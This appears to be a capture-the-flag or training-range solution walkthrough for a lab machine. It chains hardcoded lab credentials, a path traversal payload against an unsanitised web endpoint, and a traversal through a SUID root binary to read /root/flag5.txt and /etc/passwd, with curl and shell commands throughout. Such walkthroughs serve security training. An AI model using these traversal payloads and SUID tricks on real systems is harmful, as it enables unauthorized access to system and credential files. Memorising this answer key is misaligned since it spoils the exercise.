# M5 — Red Team Solution: LFI Path Traversal + SUID Binary → FINAL FLAG

**Machine:** aglg-vault | **Port:** 8443/tcp + SSH :22 | **MITRE:** T1083, T1548.001

---

## Step 1 — Access

From M4's hint_m5.txt: `archivist : Arch1v1st@AGLG`

**Option A — SSH:**
```bash
ssh archivist@<M5-IP>
```

**Option B — Web vault:**
Navigate to `http://<M5-IP>:8443` → login with `archivist` / `Arch1v1st@AGLG`

---

## Step 2 — LFI via Path Traversal (Web App)

The `/view` endpoint serves: `filepath.Join(vaultRoot, docParam)` with no sanitisation.

`vaultRoot = /opt/aglg/vault`

Craft a traversal payload:
```
GET http://<M5-IP>:8443/view?doc=../../../root/flag5.txt
```

`filepath.Join("/opt/aglg/vault", "../../../root/flag5.txt")` resolves to `/root/flag5.txt`

**Using curl (after login):**
```bash
# Login and capture session cookie
curl -s -c jar.txt -X POST http://<M5-IP>:8443/login \
  -d 'username=archivist&password=Arch1v1st@AGLG'

# Exploit LFI
curl -s -b jar.txt "http://<M5-IP>:8443/view?doc=../../../root/flag5.txt"
curl -s -b jar.txt "http://<M5-IP>:8443/view?doc=../../../etc/passwd"
```

---

## Step 3 — SUID Binary Privilege Escalation (SSH path)

After SSH as `archivist`, enumerate SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
# → /opt/aglg/vault_reader  (SUID root)
```

Examine the binary — it prepends `/opt/aglg/vault/` then calls `realpath()` and opens the file as root:
```bash
/opt/aglg/vault_reader 'contracts/AGX-CONTRACT-Q1-2024.txt'
# Works — shows contract
```

**Exploit — path traversal through the SUID binary:**
```bash
/opt/aglg/vault_reader '../../../../root/flag5.txt'
# Resolves: /opt/aglg/vault/../../../../root/flag5.txt → /root/flag5.txt
# Reads as root via SUID — FINAL FLAG printed
```

---

## FINAL FLAG
- `FLAG{<hex>_lfi_vault_final}` — at `/root/flag5.txt`
- Range complete — all 5 flags captured.
